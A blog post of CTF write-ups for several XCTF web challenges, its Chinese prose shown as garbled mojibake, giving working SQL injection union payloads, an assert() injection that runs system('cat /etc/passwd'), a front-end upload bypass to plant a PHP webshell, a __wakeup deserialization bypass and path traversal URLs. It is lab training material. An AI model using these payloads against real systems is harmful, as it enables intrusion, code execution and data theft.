<p>å…¶ä¸­ï¼Œç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªifåˆ¤æ–­ä¹‹é—´è¿›è¡Œäº†ä¸€æ¬¡ä¸»åŠ¨urlè§£ç æ“ä½œã€‚</p>
<p>èµ·åˆä»¥ä¸ºæ˜¯phpå¼±ç±»å‹ç›¸å…³é¢˜ç›®ï¼Œæ‰€ä»¥ä¼ å…¥äº†id=0ï¼Œä½†æ˜¯ä¸æ­£ç¡®ï¼Œäºæ˜¯é‡‡ç”¨å¦ä¸€ç§ã€‚</p>
<p>æ ¹æ®æºç ï¼Œéœ€è¦åœ¨ä¼ å…¥idæ—¶ç»•è¿‡ç¬¬ä¸€æ¬¡çš„ç­‰äºadminåˆ¤æ–­ï¼Œå³ç¬¬ä¸€æ¬¡adminåˆ¤æ–­ä¸ºfalseï¼Œç„¶åç»è¿‡urldecodeåï¼Œå†æ¬¡åˆ¤æ–­adminä¸ºtrueã€‚ä½†æ˜¯ç”±äºæµè§ˆå™¨æœ‰ä¸€æ¬¡urlè‡ªè§£ç æ“ä½œï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œä¸¤æ¬¡urlç¼–ç ã€‚</p>
<p>ä½¿ç”¨Burpå¯¹adminåšurläºŒæ¬¡ç¼–ç ï¼š</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331747.png" alt="1602927131742.png"></p>
<p>ä¼ å…¥idï¼Œå¾—åˆ°flagï¼š</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331756.png" alt="1602927173038.png"></p>
<h2 id="â­-NewsCenterï¼ˆå¸¸è§„SQLæ³¨å…¥ï¼‰"><a href="#â­-NewsCenterï¼ˆå¸¸è§„SQLæ³¨å…¥ï¼‰" class="headerlink" title="â­ NewsCenterï¼ˆå¸¸è§„SQLæ³¨å…¥ï¼‰"></a>â­ NewsCenterï¼ˆå¸¸è§„SQLæ³¨å…¥ï¼‰</h2><p>ä¸€é“SQLæ³¨å…¥é¢˜ç›®ï¼Œå¾ˆåŸºç¡€çš„POSTå­—ç¬¦å‹æ³¨å…¥ï¼Œé¦–å…ˆfuzzä»¥ä¸‹å¾—åˆ°å¯è§£æç¬¦å·ï¼Œæœ€ç»ˆå¾—åˆ°ä½¿ç”¨ä»¥ä¸‹payloadå¯æˆåŠŸè§£æï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1 #</span><br></pre></td></tr></table></figure>
<p>æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œå› æ­¤æŒ‰ç…§å¸¸è§„æ‰‹å·¥æ³¨å…¥æ­¥éª¤ä¾æ¬¡æ‰§è¡Œï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-1&#39; order by 3 #</span><br><span class="line">-1&#39; union select 1,2,3 #</span><br><span class="line">-1&#39; union select 1,2,table_name from information_schema.tables where table_schema&#x3D;&quot;news&quot; #</span><br><span class="line">-1&#39; union select 1,2,column_name from information_schema.columns where table_name&#x3D;&quot;secret_table&quot; #</span><br><span class="line">-1&#39; union select 1,2,fl4g from secret_table #</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°flag</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331798.png" alt="1602939552256.png"></p>
<p>ä¹Ÿå¯ä»¥sqlmapè¿›è¡Œå·¥å…·æ³¨å…¥ã€‚</p>
<h2 id="â­-mfwï¼ˆ-gitæºç æ³„éœ²-assert-å‘½ä»¤æ‰§è¡Œï¼‰"><a href="#â­-mfwï¼ˆ-gitæºç æ³„éœ²-assert-å‘½ä»¤æ‰§è¡Œï¼‰" class="headerlink" title="â­ mfwï¼ˆ.gitæºç æ³„éœ²+assert()å‘½ä»¤æ‰§è¡Œï¼‰"></a>â­ mfwï¼ˆ.gitæºç æ³„éœ²+assert()å‘½ä»¤æ‰§è¡Œï¼‰</h2><p>ç½‘ç«™ä½¿ç”¨pageå‚æ•°è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œå°è¯•ç›´æ¥åŒ…å«passwdæ–‡ä»¶ç»“æœæœ‰è¿‡æ»¤ï¼ŒAbouté¡µé¢æœ‰æç¤ºç”¨äº†Gitã€phpå’Œbootstrap</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331832.png" alt="1604045680816.png"></p>
<p>ä½¿ç”¨Gitå°±åº”è¯¥æƒ³åˆ°**.gitæºç æ³„æ¼**ï¼ŒDirbè·‘ä¸€ä¸‹æœç„¶å­˜åœ¨.gitç›®å½•ï¼Œä½¿ç”¨å·¥å…·GitHackæ¢å¤gitå†å²æ–‡ä»¶ï¼Œæ¢å¤çš„åŸç†æ˜¯ï¼š</p>
<p>è§£æ <code>.git/index</code> æ–‡ä»¶ï¼Œå¹¶æ‰¾åˆ°å·¥ç¨‹ä¸­æ‰€æœ‰çš„æ–‡ä»¶åå’Œæ–‡ä»¶ sha1ï¼Œç„¶åå» <code>.git/objects/</code> æ–‡ä»¶å¤¹ä¸‹ä¸‹è½½å¯¹åº”çš„æ–‡ä»¶ï¼Œé€šè¿‡ zlib è§£å‹æ–‡ä»¶ï¼ŒæŒ‰åŸå§‹çš„ç›®å½•ç»“æ„å†™å…¥æºä»£ç ã€‚å…·ä½“å¯å‚è€ƒä¸‹é¢çš„æ–‡ç« ï¼š</p>
<ul>
<li>gitæºç æ³„éœ²æ€»ç»“ï¼š<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36869808/article/details/88909961"><strong>https://blog.csdn.net/qq_36869808/article/details/88909961</strong></a></li>
</ul>
<p>ä½¿ç”¨GitHackæ¢å¤å‡ºä»¥ä¸‹æ–‡ä»¶ï¼Œä½†æ˜¯flagæ²¡æœ‰ç›´æ¥ç»™å‡ºï¼Œè€ƒè™‘å…¶ä»–åŠæ³•</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331970.png" alt="1604048674270ï¼ˆ1ï¼‰.png"></p>
<p>åœ¨index.phpä¸­å‘ç°äº†è¿‡æ»¤ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç¬¬9è¡Œä½¿ç”¨äº†**assert()**æ–­è¨€å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯å¯ä»¥ç”¨æ¥è¿›è¡Œä»£ç æ‰§è¡Œçš„ï¼Œè€Œä¸”è¿‡æ»¤ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯ç”¨<code>strpos (&#39;$file&#39;, &#39;..&#39;)</code>åˆ¤æ–­æ˜¯å¦å­˜åœ¨<code>..</code>ï¼Œæ—¢ç„¶çŸ¥é“äº†è¿‡æ»¤æ–¹æ³•ï¼Œä¹Ÿæ²¡æœ‰å¯¹pageå‚æ•°åšå®‰å…¨æ ¡éªŒï¼Œæ‰€ä»¥å¯ä»¥æ¥å‘½ä»¤æ‰§è¡Œ</p>
<p>é¦–å…ˆéœ€è¦é—­åˆstrposçš„å‰åŠéƒ¨åˆ†ï¼Œç„¶ååŠ å…¥system()ä»£ç ï¼Œå†é—­åˆååŠéƒ¨åˆ†ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa<span class="string">&#x27;, &#x27;</span><span class="number">123</span><span class="string">&#x27;) === false and system(&#x27;</span>cat /etc/passwd<span class="string">&#x27;) and strpos(&#x27;</span>aaa</span><br></pre></td></tr></table></figure>
<p>urlç¼–ç åä¼ å‚ï¼ŒæˆåŠŸæ‰§è¡Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa%<span class="number">27</span>%<span class="number">2</span>c+%<span class="number">27123</span>%<span class="number">27</span>)+%<span class="number">3</span>d%<span class="number">3</span>d%<span class="number">3</span>d+<span class="literal">false</span>+<span class="keyword">and</span>+system(%<span class="number">27</span>cat+%<span class="number">2</span>fetc%<span class="number">2</span>fpasswd%<span class="number">27</span>)+<span class="keyword">and</span>+strpos(%<span class="number">27</span>aaa</span><br></pre></td></tr></table></figure>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331986.png" alt="1604049280880 (1).png"></p>
<p>ä¿®æ”¹æ–‡ä»¶ä¸º./templates/flag.phpæ–‡ä»¶ï¼Œå³å¯å¾—åˆ°flag</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332006.png" alt="1604049453092 (1).png"></p>
<p>ç»è¿‡å¤§ä½¬çš„æŒ‡ç‚¹ï¼Œç†è§£äº†ä¸ºä»€ä¹ˆgitæºç ä¸­çœ‹ä¸åˆ°flagï¼Œè€Œcatå°±å¯ä»¥ï¼Œå› ä¸ºcatçš„æ–‡ä»¶å’Œ.gitä¸­å­˜æ”¾çš„ä¸æ˜¯åŒä¸€ä¸ªæ–‡ä»¶ã€‚</p>
<h2 id="â­-upload1ï¼ˆå‰ç«¯JSæ ¡éªŒç»•è¿‡ï¼‰"><a href="#â­-upload1ï¼ˆå‰ç«¯JSæ ¡éªŒç»•è¿‡ï¼‰" class="headerlink" title="â­ upload1ï¼ˆå‰ç«¯JSæ ¡éªŒç»•è¿‡ï¼‰"></a>â­ upload1ï¼ˆå‰ç«¯JSæ ¡éªŒç»•è¿‡ï¼‰</h2><p>æ‰“å¼€é¢˜ç›®ï¼Œä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ï¼Œå°è¯•ä¸Šä¼ shell.phpï¼Œæç¤ºåªå…è®¸jpgæˆ–pngï¼ŒF12åœ¨ç½‘ç»œä¸­æ²¡å‘ç°jsæ–‡ä»¶ï¼ŒæŸ¥çœ‹æºå—å‘ç°å‰ç«¯è¿‡æ»¤çš„jsæ–‡ä»¶ï¼š</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332095.png" alt="1602930407128(1).png"></p>
<p>ä½¿ç”¨NoScriptæ— æ•ˆåï¼Œç´¢æ€§æŠ“åŒ…å¹¶ä¸»åŠ¨å“åº”è¯¥è¯·æ±‚ï¼Œä¿®æ”¹å“åº”åŒ…çš„jsæºç ï¼Œç›´æ¥å°†æ ¡éªŒå‡½æ•°return trueï¼š</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332108.png" alt="1602930629651.png"></p>
<p>å†æ¬¡ä¸Šä¼ shell.phpï¼Œå³å¯æˆåŠŸä¸Šä¼ </p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332116.png" alt="1602930706543.png"></p>
<p>èšå‰‘è¿æ¥ï¼Œåœ¨webæ ¹ç›®å½•å‘ç°flag.phpï¼Œå¾—åˆ°flag</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332124.png" alt="1602930765924.png"></p>
<p>å½“ç„¶è¿˜å¯ä»¥é€šè¿‡ä¿®æ”¹åç¼€çš„æ–¹å¼æ¥ç»•è¿‡å‰ç«¯æ ¡éªŒã€‚</p>
<h2 id="â­-ics-04ï¼ˆSQLæ³¨å…¥-æ³¨å†Œè¦†ç›–ï¼‰"><a href="#â­-ics-04ï¼ˆSQLæ³¨å…¥-æ³¨å†Œè¦†ç›–ï¼‰" class="headerlink" title="â­ ics-04ï¼ˆSQLæ³¨å…¥+æ³¨å†Œè¦†ç›–ï¼‰"></a>â­ ics-04ï¼ˆSQLæ³¨å…¥+æ³¨å†Œè¦†ç›–ï¼‰</h2><p>é¢˜ç›®æè¿°ï¼Œåœ¨ç³»ç»Ÿåœ°ç™»å½•å’Œæ³¨å†Œå¤„å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œç«‹é©¬æƒ³åˆ°å¯èƒ½æ˜¯SQLæ³¨å…¥ã€‚</p>
<p>ç³»ç»Ÿæœ‰æ³¨å†Œã€ç™»å½•å’Œæ‰¾å›å¯†ç ä¸‰å¤„åŠŸèƒ½ï¼Œæ³¨å†Œäº†å‡ ä¸ªè´¦æˆ·ï¼Œç™»é™†åä½“æœ¯æ™®é€šç”¨æˆ·ç™»é™†æ— æ•ˆï¼Œçœ‹æ¥éœ€è¦ç®¡ç†å‘˜è´¦æˆ·æˆ–æƒé™</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332371.png" alt="1604221348795.png"></p>
<p>å°è¯•åœ¨æ³¨å†Œå¤„æŠ“åŒ…ï¼Œé€šè¿‡user levelä¿®æ”¹æƒé™è¿›è¡Œè¶Šæƒï¼Œä½†æ˜¯æ²¡æœ‰å‘ç°ç›¸å…³å‚æ•°ã€‚</p>
<p>æ¥ç€åœ¨æ‰¾å›å¯†ç å¤„å‘ç°äº†SQLæ³¨å…¥ï¼Œç›´æ¥ä¸¢SQLmapè·‘å‡ºäº†userè¡¨çš„å†…å®¹ï¼Œå¾—åˆ°ä¸€ä¸ªé»˜è®¤è´¦æˆ·ï¼ŒçŒœæµ‹æ˜¯ç®¡ç†å‘˜è´¦æˆ·</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332386.png" alt="1604221498269(1).png"></p>
<p>å¯†ç MD5ç›´æ¥è·‘å‡ºæ¥äº†ğŸ˜‚åº”è¯¥æ˜¯åšäº†è¿™ä¸ªé¢˜åæ·»åŠ äº†è¿™æ¡è®°å½•å§</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332417.png" alt="1604221772450.png"></p>
<p>ç™»å½•è¯¥è´¦æˆ·ï¼Œå³å¯å¾—åˆ°flagã€‚</p>
<p>ä½†æ˜¯è¿™é“é¢˜åº”è¯¥ä¸æ˜¯ä»…ä»…åˆ©ç”¨ä¸€ä¸ªSQLæ³¨å…¥çš„ï¼ŒåŸæ„æ˜¯å¯†ç æ— æ³•è§£å¼€å§ï¼Œæ‰€ä»¥åœ¨SQLæ³¨å…¥å¾—åˆ°ç®¡ç†å‘˜ç”¨æˆ·ååï¼Œéœ€è¦åˆ©ç”¨é‡å¤æ³¨å†Œæ¼æ´æ¥è¦†ç›–ç®¡ç†å‘˜å¯†ç </p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332426.png" alt="1604222001521.png"></p>
<p>ç”¨è®¾å®šçš„æ–°å¯†ç ç™»å½•ï¼Œå³å¯å¾—åˆ°flag</p>
<h2 id="â­-unserialize3ï¼ˆphpååºåˆ—åŒ–-wakeup-ç»•è¿‡ï¼‰"><a href="#â­-unserialize3ï¼ˆphpååºåˆ—åŒ–-wakeup-ç»•è¿‡ï¼‰" class="headerlink" title="â­ unserialize3ï¼ˆphpååºåˆ—åŒ–__wakeup()ç»•è¿‡ï¼‰"></a>â­ unserialize3ï¼ˆphpååºåˆ—åŒ–__wakeup()ç»•è¿‡ï¼‰</h2><p>é¢˜ç›®æ˜¯ä¸€æ®µphpä»£ç ï¼Œæ˜¯ååºåˆ—åŒ–é¢˜ç›®ï¼Œéœ€è¦å°†åºåˆ—åŒ–ç»“æœé€šè¿‡codeä¼ é€’ã€‚</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/14/1605324557.png" alt="1602406299342.png"></p>
<p>æºç ä¿å­˜åˆ°æœ¬åœ°ï¼Œæ·»åŠ åºåˆ—åŒ–ä»£ç è¿›è¡Œå®¡è®¡å’Œè¾“å‡ºæµ‹è¯•ï¼Œéœ€è¦è¡¥å…¨å¤§æ‹¬å·</p>
<pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> xctf;</span><br><span class="line"><span class="keyword">echo</span>(serialize(<span class="variable">$s</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</code></pre>
<p>é¦–å…ˆå‘ç°ï¼Œä»£ç ä¸­å­˜åœ¨__wakeup()é­”æœ¯æ–¹æ³•ï¼Œè¯¥é­”æœ¯æ–¹æ³•åœ¨ååºåˆ—åŒ–æ“ä½œæ‰§è¡Œå‰è°ƒç”¨ï¼Œç”¨äºåˆå§‹åŒ–æ“ä½œï¼Œå¦‚è·å–å¿…è¦èµ„æºç­‰ã€‚</p>
<p>ä½†æ˜¯æœ¬é¢˜ä¸­<code>__wakeup()</code>å†…å®¹æ˜¯ç»“æŸç¨‹åºï¼Œå› æ­¤å¾ˆæ˜æ˜¾æœ¬é¢˜æ˜¯è¦åˆ©ç”¨__wakeup()é­”æœ¯æ–¹æ³•çš„å¤±æ•ˆæ¼æ´ï¼Œå³<strong>åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå½“å¯¹è±¡å±æ€§ä¸ªæ•°å¤§äºçœŸå®ä¸ªæ•°ï¼Œå°±ä¼šç»•è¿‡è¯¥é­”æœ¯æ–¹æ³•ç›´æ¥æ‰§è¡Œååºåˆ—åŒ–æ“ä½œã€‚</strong></p>
<p>æ‰§è¡Œè¯¥ä»£ç ï¼Œå¾—åˆ°ä»¥ä¸‹åºåˆ—åŒ–ç»“æœï¼š</p>
<pre><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;
</code></pre>
<p>å°†å±æ€§æ•°é‡æ”¹ä¸ºå¤§äºå½“å‰æ•°é‡çš„å€¼ï¼Œæ¯”å¦‚2ï¼Œç„¶åå‘åŒ…ï¼Œå³å¯å¾—åˆ°flag</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/14/1605324566.png" alt="1602405430595.png"></p>
<h2 id="â­-warmupï¼ˆæ–‡ä»¶åŒ…å«ï¼‰"><a href="#â­-warmupï¼ˆæ–‡ä»¶åŒ…å«ï¼‰" class="headerlink" title="â­ warmupï¼ˆæ–‡ä»¶åŒ…å«ï¼‰"></a>â­ warmupï¼ˆæ–‡ä»¶åŒ…å«ï¼‰</h2><p><a target="_blank" rel="noopener" href="https://www.yyxzz.net/articles/169.html"><strong>https://www.yyxzz.net/articles/169.html</strong></a></p>
<p>é¢˜ç›®å‡ºè‡ª2018 HCTFï¼Œæ‰“å¼€é“¾æ¥ï¼ˆæ»‘ç¨½.jpgï¼‰ğŸ§<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/17/1602923174.png" alt="1602763719432.png"></p>
<p>å°†å›¾ç‰‡ä¿å­˜åˆ°æœ¬åœ°æ²¡æœ‰å‘ç°çº¿ç´¢ï¼ŒæŸ¥çœ‹ç½‘é¡µæºç ï¼Œå‘ç°äº†æç¤ºï¼š<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/17/1602923200.png" alt="1602763786996.png"></p>
<p>å­˜åœ¨source.phpï¼Œäºæ˜¯åœ°å€åè¾¹è·Ÿsource.phpï¼ŒæˆåŠŸè¾“å‡ºæºç <br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/17/1602923210.png" alt="1602763852951.png"></p>
<p><strong>ä¿å­˜è‡³æœ¬åœ°ï¼Œè¿›è¡Œä»£ç å®¡è®¡</strong></p>
<p>ä½†æ˜¯å®¡è®¡æ—¶å‘ç°ï¼Œè¯¶ï¼Œæ€ä¹ˆæœ‰ç‚¹ç†Ÿæ‚‰ï¼Œå¥½åƒä¹‹å‰å¤ç°äº†ä¸€ä¸ªphpmyadminä»»æ„æ–‡ä»¶åŒ…å«çš„æ¼æ´ï¼Œè·Ÿè¿™ä¸ªé¢˜ç›®çš„æºç é€»è¾‘ä¸€æ¨¡ä¸€æ ·ï¼Œå¤ªæ£’äº†ï¼</p>
<p>å…·ä½“çš„å®¡è®¡è¿‡ç¨‹å¯ä»¥å‚è€ƒä¹‹å‰çš„phpmyadminæ¼æ´å¤ç°ï¼ŒåŸç†ä¸€æ¨¡ä¸€æ ·ï¼</p>
<p>è¿™é‡Œå¤§è‡´è¯´ä¸€ä¸‹æ¼æ´ï¼š</p>
<ul>
<li>ç¨‹åºè®¾å®šæ–‡ä»¶ç™½åå•ï¼Œå¹¶åˆ©ç”¨ï¼Ÿåˆ†å‰²åçš„ç¬¬ä¸€ä¸ªæ•°æ®æ¥åšç™½åå•æ ¡éªŒï¼Œè¿˜åŠ å…¥äº†urldecodeï¼Œå› æ­¤å¯ä»¥äºŒæ¬¡ä¼ é€’è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œè¾¾åˆ°ä»»æ„æ–‡ä»¶è¯»å–ã€‚</li>
</ul>
<p>OKå›åˆ°é¢˜ç›®ï¼Œç»è¿‡å¯¹source.phpå®¡è®¡å‘ç°ï¼Œè¿˜æœ‰ä¸€ä¸ªhint.phpï¼Œå› ä¸ºæ˜¯ç™½åå•å†…æ‰€ä»¥æ­£å¸¸åŒ…å«è¯¥æ–‡ä»¶ï¼Œå¾—åˆ°ä»¥ä¸‹å…³äºflagçš„çº¿ç´¢ï¼šå­˜åœ¨äº ffffllllaaaagggg æ–‡ä»¶å†…<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/17/1602923287.png" alt="1602764402114.png"></p>
<p>åœ¨å½“å‰ç›®å½•åŒ…å«å¤±è´¥åï¼Œè€ƒè™‘å¯èƒ½å­˜åœ¨äºæ ¹ç›®å½•ï¼Œäºæ˜¯ä¸æ–­å°è¯•åˆ©ç”¨passwdæ–‡ä»¶æ‰¾åˆ°æ ¹ç›®å½•</p>
<p>payloadï¼š</p>
<pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.133:54486?file&#x3D;hint.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
</code></pre>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/17/1602923309.png" alt="1602764669041.png"></p>
<p>æ ¹ç›®å½•åŒ…å«flagæ–‡ä»¶ï¼Œå¾—åˆ°flag</p>
<p>payloadï¼š<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.133:54486?file&#x3D;hint.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/17/1602923324.png" alt="1602764846675.png"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="mailto:undefined">Sma11New</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="https://blog.sma11new.com/post/20200972133.html">https://blog.sma11new.com/post/20200972133.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="https://blog.sma11new.com" target="_blank">Sma11New</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/XCTF/">XCTF</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/post/20201052133.html"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">ä¸Šä¸€ç¯‡</div><div class="prev_info">ã€æ¼æ´åˆ†æã€‘CVE-2016-5734 - phpmyadminè¿œç¨‹ä»£ç æ‰§è¡Œ</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/XiaoXin.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Sma11New</div><div class="author-info__description">You can't have national security without cybersecurity</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">8</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">11</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Sma11New"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Sma11New" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://blog.csdn.net/qq_43968080" target="_blank" title="CSDN"><i class="fab fa-creative-commons"></i></a><a class="social-icon" href="mailto:Sma11New@163.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>å…¬å‘Š</span></div><div class="announcement_content">This is my new blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-Web-php-unserialize%EF%BC%88-wakeup-%E7%BB%95%E8%BF%87-%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">â­ Web_php_unserializeï¼ˆ__wakeup()ç»•è¿‡+æ­£åˆ™åŒ¹é…ç»•è¿‡ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-fakebook%EF%BC%88SSRF-SQL%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-text">â­ fakebookï¼ˆSSRF+SQLæ³¨å…¥ï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 